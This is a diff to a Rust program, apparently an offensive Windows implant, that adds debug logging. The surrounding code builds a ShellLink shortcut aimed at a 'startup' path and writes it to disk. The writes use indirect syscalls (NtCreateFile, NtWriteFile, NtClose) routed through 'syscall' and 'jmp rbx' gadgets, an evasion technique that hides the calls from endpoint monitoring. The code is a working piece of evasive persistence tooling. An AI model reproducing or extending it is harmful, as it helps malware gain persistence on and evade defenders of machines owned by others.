@@ -224,6 +224,7 @@ fn main() {
 
         let unicode_startup = create_unicode_string(&full_path_wide);
         println!("[+] Target NT path: {}", String::from_utf16_lossy(&full_path_wide));
+        println!("[+] unicode_startup - Length: {}, MaxLength: {}, Buffer: {:?}", unicode_startup.Length, unicode_startup.MaximumLength, unicode_startup.Buffer);
 
         let mut shell_link_ptr: *mut c_void = null_mut();
         // Try with CLSCTX_INPROC_SERVER (1) first as it is standard for ShellLink
@@ -278,9 +279,14 @@ fn main() {
                         let hr_stat = ((*stream_vtbl).Stat)(stream as *mut _, &mut stat, 1);
                         println!("[+] IStream::Stat: 0x{:08X}, cbSize: {}", hr_stat as u32, stat.cbSize);
                         if hr_stat == S_OK {
+                            println!("[*] GetHGlobalFromStream...");
                             let mut hglobal: *mut c_void = null_mut();
-                            GetHGlobalFromStream(stream, &mut hglobal);
+                            let hr_hglob = GetHGlobalFromStream(stream, &mut hglobal);
+                            println!("[+] GetHGlobalFromStream: 0x{:08X}, hglobal: {:?}", hr_hglob as u32, hglobal);
+
+                            println!("[*] GlobalLock...");
                             let data_ptr = GlobalLock(hglobal);
+                            println!("[+] GlobalLock: {:?}", data_ptr);
                             if !data_ptr.is_null() {
                                 let mut out_handle: HANDLE = 0;
                                 let mut io_status = IO_STATUS_BLOCK { Status: 0, Information: 0 };
@@ -293,6 +299,7 @@ fn main() {
                                     SecurityQualityOfService: null_mut(),
                                 };
 
+                                println!("[*] Calling NtCreateFile...");
                                 let status = crate::syscall!(
                                     nt_create_file_ssn,
                                     syscall_gadget,
@@ -301,7 +308,7 @@ fn main() {
                                     (GENERIC_WRITE | SYNCHRONIZE) as usize,
                                     &mut obj_attr as *mut _ as usize,
                                     &mut io_status as *mut _ as usize,
-                                    0, // AllocationSize
+                                    0, // AllocationSize (pointer)
                                     FILE_ATTRIBUTE_NORMAL as usize,
                                     3, // ShareAccess (FILE_SHARE_READ | FILE_SHARE_WRITE)
                                     FILE_OVERWRITE_IF as usize,
@@ -309,7 +316,7 @@ fn main() {
                                     0, // EaBuffer
                                     0  // EaLength
                                 );
-                                println!("[+] NtCreateFile status: 0x{:08X}", status as u32);
+                                println!("[+] NtCreateFile status: 0x{:08X}, handle: 0x{:X}", status as u32, out_handle);
 
                                 if status == 0 {
                                     let mut write_io_status = IO_STATUS_BLOCK { Status: 0, Information: 0 };
@@ -329,8 +336,9 @@ fn main() {
                                         &mut write_byte_offset as *mut _ as usize,
                                         0  // Key
                                     );
-                                    println!("[+] NtWriteFile status: 0x{:08X}", write_status as u32);
-                                    crate::syscall!(nt_close_ssn, syscall_gadget, jmp_rbx_gadget, out_handle as usize);
+                                    println!("[+] NtWriteFile status: 0x{:08X}, info: {}", write_status as u32, write_io_status.Information);
+                                    let close_status = crate::syscall!(nt_close_ssn, syscall_gadget, jmp_rbx_gadget, out_handle as usize);
+                                    println!("[+] NtClose status: 0x{:08X}", close_status as u32);
                                 }
                                 GlobalUnlock(hglobal);
                             }
